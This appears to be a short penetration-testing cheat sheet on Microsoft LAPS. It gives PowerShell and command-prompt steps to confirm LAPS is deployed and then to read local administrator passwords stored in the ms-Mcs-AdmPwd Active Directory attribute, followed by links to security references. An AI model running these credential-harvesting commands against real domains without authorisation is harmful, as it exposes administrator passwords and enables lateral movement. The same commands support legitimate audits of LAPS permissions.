# Living off the Land

## 01 - Enumerate

Check the registry entry if LAPS is enabled.

```
C:\> reg.exe query "HKLM\SOFTWARE\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

PS C:\> Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -Name "AdmPwdEnabled"
```

Check if that folder exists and contains `AdmPwd.dll`.

```
C:\> dir "C:\Program Files\LAPS\CSE"

PS C:\> Get-ChildItem -Path "C:\Program Files\LAPS\CSE"

PS C:\> Get-ChildItem -Path "C:\Program Files\LAPS\CSE\Admpwd.dll"
```

Enumerate native LAPS PowerShell cmdlets if they are installed.

```
PS C:\> Get-Command *AdmPwd*
```

## 02 - Harvest Credentials

### 2.1 - Command Prompt

If RSAT is enabled then look for `ms-MCS-AdmPwd`.

```
C:\> dsacls.exe "OU=Managed Computers - LAPS,DC=<DOMAIN>,DC=<TLD>"
```

### 2.2 - PowerShell

Find the principals that have **ReadProperty** on `ms-Mcs-AdmPwd`.

```
PS C:\> Get-AdmPwdPassword -ComputerName <IP> | Format-List
```

Enable RSAT then look for `ms-MCS-AdmPwd`.

```
PS C:\> Import-Module ActiveDirectory

PS C:\> Get-ADComputer -Identity LAB-WIN7CLONE -Properties *
```

You can use **ADSI (Active Directory Service Interfaces)** to retrieve computer properties if RSAT isn't installed or enabled.

```powershell
PS C:\> $domain = New-Object DirectoryServices.DirectoryEntry("LDAP://OU=Managed Computers - LAPS,DC=<DOMAIN>,DC=<TLD>")
$user = $domain.Get_Children().find('CN=<COMPUTERNAME>')
$user | Format-List *
```

---
## References

### Hacktricks

- [Hacktricks: LAPS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

### ADSecurity

- [ADSecurity: Microsoft Local Administrator Password Solution (LAPS)](https://adsecurity.org/?p=1790)

### Hacking Articles

- [Hacking Articles: Credential Dumping - LAPS](https://www.hackingarticles.in/credential-dumpinglaps/)

### ExploitDB

- [Exploit DB: Abusing LAPS](https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf)

### Akijosberry

- [Akijosberry: Malicious use of Microsoft LAPS](https://akijosberryblog.wordpress.com/2019/01/01/malicious-use-of-microsoft-laps/)